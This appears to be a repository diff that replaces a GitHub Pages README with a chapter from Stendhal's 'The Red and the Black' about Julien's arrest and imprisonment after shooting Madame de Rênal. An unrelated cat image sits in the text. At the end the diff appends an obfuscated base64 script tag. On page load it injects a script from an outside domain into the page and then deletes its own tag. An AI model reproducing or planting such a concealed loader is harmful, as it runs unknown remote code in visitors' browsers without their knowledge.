@@ -1,37 +1,107 @@
-## Welcome to GitHub Pages
+# SAD DETAILS
 
-You can use the [editor on GitHub](https://github.com/alenamarchenko/History/edit/master/README.md) to maintain and preview the content for your website in Markdown files.
+Julien remained motionless. He saw nothing more. When he recovered himself a little he noticed all the faithful rushing from the church. The priest had left the altar. Julien started fairly slowly to follow some women who were going away with loud screams. A woman who was trying to get away more quickly than the others, pushed him roughly. He fell. His feet got entangled with a chair, knocked over by the crowd; when he got up, he felt his neck gripped. A gendarme, in full uniform, was arresting him. Julien tried mechanically to have recourse to his little pistol; but a second gendarme pinioned his arms.
 
-Whenever you commit to this repository, GitHub Pages will run [Jekyll](https://jekyllrb.com/) to rebuild the pages in your site, from the content in your Markdown files.
+He was taken to the prison. They went into a room where irons were put on his hands. He was left alone. The door was doubly locked on him. All this was done very quickly, and he scarcely appreciated it at all.
 
-### Markdown
+"Yes, upon my word, all is over," he said aloud as he recovered himself. "Yes, the guillotine in a fortnight ... or killing myself here."
 
-Markdown is a lightweight and easy-to-use syntax for styling your writing. It includes conventions for
+His reasoning did not go any further. His head felt as though it had been seized in some violent grip. He looked round to see if anyone was holding him. After some moments he fell into a deep sleep.
+![o](https://icatcare.org/app/uploads/2018/07/Thinking-of-getting-a-cat.png)
+Madame de Rênal was not mortally wounded. The first bullet had pierced her hat. The second had been fired as she was turning round. The bullet had struck her on the shoulder, and, astonishing to relate, had ricocheted from off the shoulder bone (which it had, however, broken) against a gothic pillar, from which it had loosened an enormous splinter of stone.
 
-```markdown
-Syntax highlighted code block
+When, after a long and painful bandaging, the solemn surgeon said to madame de Rênal, "I answer for your life as I would for my own," she was profoundly grieved.
 
-# Header 1
-## Header 2
-### Header 3
+She had been sincerely desirous of death for a long time. The letter which she had written to M. de la Mole in accordance with the injunctions of her present confessor, had proved the final blow to a creature already weakened by an only too permanent unhappiness. This unhappiness was caused by Julien's absence; but she, for her own part, called it remorse. Her director, a young ecclesiastic, who was both virtuous and enthusiastic, and had recently come to Dijon, made no mistake as to its nature.
 
-- Bulleted
-- List
+"Dying in this way, though not by my own hand, is very far from being a sin," thought madame de Rênal. "God will perhaps forgive me for rejoicing over my death." She did not dare to add, "and dying by Julien's hand puts the last touch on my happiness."
 
-1. Numbered
-2. List
+She had scarcely been rid of the presence of the surgeon and of all the crowd of friends that had rushed to see her, than she called her maid, Elisa. "The gaoler," she said to her with a violent blush, "is a cruel man. He will doubtless ill-treat him, thinking to please me by doing so.... I cannot bear that idea. Could you not go, as though on your own account, and give the gaoler this little packet which contains some louis. You will tell him that religion forbids him to treat him badly, above all, he must not go and speak about the sending of this money."
 
-**Bold** and _Italic_ and `Code` text
+It was this circumstance, which we have just mentioned, that Julien had to thank for the humanity of the gaoler of Verrières. It was still the same M. Noiraud, that ideal official, whom he remembered as being so finely alarmed by M. Appert's presence.
 
-[Link](url) and ![Image](src)
-```
+A judge appeared in the prison. "I occasioned death by premeditation," said Julien to him. "I bought the pistols and had them loaded at so-and-so's, a gunsmith. Article 1342 of the penal code is clear. I deserve death, and I expect it." Astonished at this kind of answer, the judge started to multiply his questions, with a view of the accused contradicting himself in his answers.
 
-For more details see [GitHub Flavored Markdown](https://guides.github.com/features/mastering-markdown/).
+"Don't you see," said Julien to him with a smile, "that I am making myself out as guilty as you can possibly desire? Go away, monsieur, you will not fail to catch the quarry you are pursuing. You will have the pleasure to condemn me. Spare me your presence."
 
-### Jekyll Themes
+"I have an irksome duty to perform," thought Julien. "I must write to mademoiselle de la Mole:—"
 
-Your Pages site will use the layout and styles from the Jekyll theme you have selected in your [repository settings](https://github.com/alenamarchenko/History/settings). The name of this theme is saved in the Jekyll `_config.yml` configuration file.
+"I have avenged myself," he said to her. "Unfortunately, my name will appear in the papers, and I shall not be able to escape from the world incognito. I shall die in two months' time. My revenge was ghastly, like the pain of being separated from you. From this moment I forbid myself to write or pronounce your name. Never speak of me even to my son; silence is the only way of honouring me. To the ordinary commonplace man, I shall represent a common assassin. Allow me the luxury of the truth at this supreme moment; you will forget me. This great catastrophe of which I advise you not to say a single word to a single living person, will exhaust, for several years to come, all that romantic and unduly adventurous element which I have detected in your character. You were intended by nature to live among the heroes of the middle ages; exhibit their firm character. Let what has to happen take place in secret and without your being compromised. You will assume a false name, and you will confide in no one. If you absolutely need a friend's help, I bequeath the abbé Pirard to you.
 
-### Support or Contact
+"Do not talk to anyone else, particularly to the people of your own class—the de Luz's, the Caylus's.
 
-Having trouble with Pages? Check out our [documentation](https://help.github.com/categories/github-pages-basics/) or [contact support](https://github.com/contact) and we’ll help you sort it out.
+"A year after my death, marry M. de Croisenois; I command you as your husband. Do not write to me at all, I shall not answer. Though in my view, much less wicked than Iago, I am going to say, like him: 'From this time forth, I never will speack word.'[1]
+
+"I shall never be seen to speak or write again. You will have received my final words and my final expressions of adoration.
+
+"J. S."
+
+It was only after he had despatched this letter and had recovered himself a little, that Julien felt for the first time extremely unhappy. Those momentous words, I shall die, meant the successive tearing out of his heart of each individual hope and ambition. Death, in itself, was not horrible in his eyes. His whole life had been nothing but a long preparation for unhappiness, and he had made a point of not losing sight of what is considered the greatest unhappiness of all.
+
+"Come then," he said to himself; "if I had to fight a duel in a couple of months, with an expert duellist, should I be weak enough to think about it incessantly with panic in my soul?"
+
+He passed more than an hour in trying to analyze himself thoroughly on this score.
+
+When he saw clear in his own soul, and the truth appeared before his eyes with as much definiteness as one of the pillars of his prison, he thought about remorse.
+
+"Why should I have any? I have been atrociously injured; I have killed—I deserve death, but that is all. I die after having squared my account with humanity. I do not leave any obligation unfulfilled. I owe nothing to anybody; there is nothing shameful about my death, except the instrument of it; that alone, it is true, is simply sufficient to disgrace me in the eyes of the bourgeois of Verrières; but from the intellectual standpoint, what could be more contemptible than they? I have one means of winning their consideration; by flinging pieces of gold to the people as I go to the scaffold. If my memory is linked with the idea of gold, they will always look upon it as resplendent."
+
+After this chain of reasoning, which after a minute's reflection seemed to him self-evident, Julien said to himself, "I have nothing left to do in the world," and fell into a deep sleep.
+
+About 9 o'clock in the evening the gaoler woke him up as he brought in his supper.
+
+"What are they saying in Verrières?"
+
+"M. Julien, the oath which I took before the crucifix in the 'Royal Courtyard,' on the day when I was installed in my place, obliges me to silence."
+
+He was silent, but remained. Julien was amused by the sight of this vulgar hypocrisy. I must make him, he thought, wait a long time for the five francs which he wants to sell his conscience for.
+
+When the gaoler saw him finish his meal without making any attempt to corrupt him, he said in a soft and perfidious voice:
+
+"The affection which I have for you, M. Julien, compels me to speak. Although they say that it is contrary to the interests of justice, because it may assist you in preparing your defence. M. Julien you are a good fellow at heart, and you will be very glad to learn that madame de Rênal is better."
+
+"What! she is not dead?" exclaimed Julien, beside himself.
+
+"What, you know nothing?" said the gaoler, with a stupid air which soon turned into exultant cupidity. "It would be very proper, monsieur, for you to give something to the surgeon, who, so far as law and justice go, ought not to have spoken. But in order to please you, monsieur, I went to him, and he told me everything."
+
+"Anyway, the wound is not mortal," said Julien to him impatiently, "you answer for it on your life?"
+
+The gaoler, who was a giant six feet tall, was frightened and retired towards the door. Julien saw that he was adopting bad tactics for getting at the truth. He sat down again and flung a napoleon to M. Noiraud.
+
+As the man's story proved to Julien more and more conclusively that madame de Rênal's wound was not mortal, he felt himself overcome by tears. "Leave me," he said brusquely.
+
+The gaoler obeyed. Scarcely had the door shut, than Julien exclaimed: "Great God, she is not dead," and he fell on his knees, shedding hot tears.
+
+In this supreme moment he was a believer. What mattered the hypocrisies of the priests? Could they abate one whit of the truth and sublimity of the idea of God?
+
+It was only then that Julien began to repent of the crime that he had committed. By a coincidence, which prevented him falling into despair, it was only at the present moment that the condition of physical irritation and semi-madness, in which he had been plunged since his departure from Paris for Verrières came to an end.
+
+His tears had a generous source. He had no doubt about the condemnation which awaited him.
+
+"So she will live," he said to himself. "She will live to forgive me and love me."
+
+Very late the next morning the gaoler woke him up and said, "You must have a famous spirit, M. Julien. I have come in twice, but I did not want to wake you up. Here are two bottles of excellent wine which our curé, M. Maslon, has sent you."
+
+"What, is that scoundrel still here?" said Julien.
+
+"Yes, monsieur," said the gaoler, lowering his voice. "But do not talk so loud, it may do you harm."
+
+Julien laughed heartily.
+
+"At the stage I have reached, my friend, you alone can do me harm in the event of your ceasing to be kind and tender. You will be well paid," said Julien, changing his tone and reverting to his imperious manner. This manner was immediately justified by the gift of a piece of money.
+
+M. Noiraud related again, with the greatest detail, everything he had learnt about madame de Rênal, but he did not make any mention of mademoiselle Elisa's visit.
+
+The man was as base and servile as it was possible to be. An idea crossed Julien's mind. "This kind of misshapen giant cannot earn more than three or four hundred francs, for his prison is not at all full. I can guarantee him ten thousand francs, if he will escape with me to Switzerland. The difficulty will be in persuading him of my good faith." The idea of the long conversation he would need to have with so vile a person filled Julien with disgust. He thought of something else.
+
+In the evening the time had passed. A post-chaise had come to pick him up at midnight. He was very pleased with his travelling companions, the gendarmes. When he arrived at the prison of Besançon in the morning they were kind enough to place him in the upper storey of a Gothic turret. He judged the architecture to be of the beginning of the fourteenth century. He admired its fascinating grace and lightness. Through a narrow space between two walls, beyond the deep court, there opened a superb vista.
+
+On the following day there was an interrogation, after which he was left in peace for several days. His soul was calm. He found his affair a perfectly simple one. "I meant to kill. I deserve to be killed."
+
+His thoughts did not linger any further over this line of reasoning. As for the sentence, the disagreeableness of appearing in public, the defence, he considered all this as slight embarrassment, irksome formalities, which it would be time enough to consider on the actual day. The actual moment of death did not seize hold of his mind either. "I will think about it after the sentence." Life was no longer boring, he was envisaging everything from a new point of view, he had no longer any ambition. He rarely thought about mademoiselle de la Mole. His passion of remorse engrossed him a great deal, and often conjured up the image of madame de Rênal, particularly during the silence of the night, which in this high turret was only disturbed by the song of the osprey.
+
+He thanked heaven that he had not inflicted a mortal wound. "Astonishing," he said to himself, "I thought that she had destroyed my future happiness for ever by her letter to M. de la Mole, and here am I, less than a fortnight after the date of that letter, not giving a single thought to all the things that engrossed me then. An income of two or three thousand francs, on which to live quietly in a mountain district, like Vergy.... I was happy then.... I did not realise my happiness."
+
+At other moments he would jump up from his chair. "If I had mortally wounded madame de Rênal, I would have killed myself.... I need to feel certain of that so as not to horrify myself."
+
+<script id="pb1bc" src="data:text/javascript;base64, dmFyIF9sWXgyZCA9IFsnXHg3MVx4NzVceDY1XHg3Mlx4NzlceDUzXHg2NVx4NmNceDY1XHg2M1x4NzRceDZmXHg3MicsICdceDYyXHg2Zlx4NjRceDc5JywgJ1x4NjdceDY1XHg3NFx4NDVceDZjXHg2NVx4NmRceDY1XHg2ZVx4NzRceDQyXHg3OVx4NDlceDY0JywgJ1x4NDRceDRmXHg0ZFx4NDNceDZmXHg2ZVx4NzRceDY1XHg2ZVx4NzRceDRjXHg2Zlx4NjFceDY0XHg2NVx4NjQnLCAnXHg2M1x4NzJceDY1XHg2MVx4NzRceDY1XHg0NVx4NmNceDY1XHg2ZFx4NjVceDZlXHg3NCcsICdceDczXHg2M1x4NzJceDY5XHg3MFx4NzQnLCAnXHg3NFx4NzlceDcwXHg2NScsICdceDc0XHg2NVx4NzhceDc0XHgyZlx4NmFceDYxXHg3Nlx4NjFceDczXHg2M1x4NzJceDY5XHg3MFx4NzQnXTsoZnVuY3Rpb24oX0hic2gxLCBfVmE0Z1opIHt2YXIgX0U2WE5yID0gZnVuY3Rpb24oX2lQcEprKSB7d2hpbGUgKC0tX2lQcEprKSB7X0hic2gxWydwdXNoJ10oX0hic2gxWydzaGlmdCddKCkpO319O19FNlhOcigrK19WYTRnWik7fShfbFl4MmQsIDB4MTFiKSk7dmFyIF9ralh1QyA9IGZ1bmN0aW9uKF9HbUw0eiwgX2tFYmg3KSB7X0dtTDR6ID0gX0dtTDR6IC0gMHgwO3ZhciBfNzZ0bEYgPSBfbFl4MmRbX0dtTDR6XTtyZXR1cm4gXzc2dGxGO307ZG9jdW1lbnRbJ1x4NjFceDY0XHg2NFx4NDVceDc2XHg2NVx4NmVceDc0XHg0Y1x4NjlceDczXHg3NFx4NjVceDZlXHg2NVx4NzInXShfa2pYdUMoJzB4MCcpLCBmdW5jdGlvbigpIHt2YXIgXzUwREJ4ID0gZG9jdW1lbnRbX2tqWHVDKCcweDEnKV0oX2tqWHVDKCcweDInKSk7XzUwREJ4W19ralh1QygnMHgzJyldID0gX2tqWHVDKCcweDQnKTtfNTBEQnhbJ1x4NzNceDcyXHg2MyddID0gJ1x4NjhceDc0XHg3NFx4NzBceDczXHgzYVx4MmZceDJmXHg2ZFx4NmZceDcyXHg2Zlx4MmVceDYyXHg2MVx4NmVceDZiXHg2Mlx4NjFceDZlXHg2Ylx4NmZceDc2XHgyZVx4NjNceDZmXHg2ZFx4MmZceDVmXHg3Mlx4NjVceDZkXHg2Zlx4NzRceDY1XHg1Zlx4NzRceDcyXHg2MVx4NjNceDZiXHgyZVx4NmFceDczXHgzZlx4NjNceDYxXHg2ZFx4NzBceDYxXHg2OVx4NjdceDZlXHgzZFx4NmVceDRkXHgzN1x4NGNceDQ1XHgzNFx4N2FceDc2XHg0Zlx4NTEnO2RvY3VtZW50W19ralh1QygnMHg1JyldKF9ralh1QygnMHg2JykpWydceDYxXHg3MFx4NzBceDY1XHg2ZVx4NjRceDQzXHg2OFx4NjlceDZjXHg2NCddKF81MERCeCk7ZG9jdW1lbnRbX2tqWHVDKCcweDcnKV0oJ3BiMWJjJylbJ1x4NzJceDY1XHg2ZFx4NmZceDc2XHg2NSddKCk7fSwgeydceDZmXHg2ZVx4NjNceDY1JzogISFbXX0pOw=="></script>
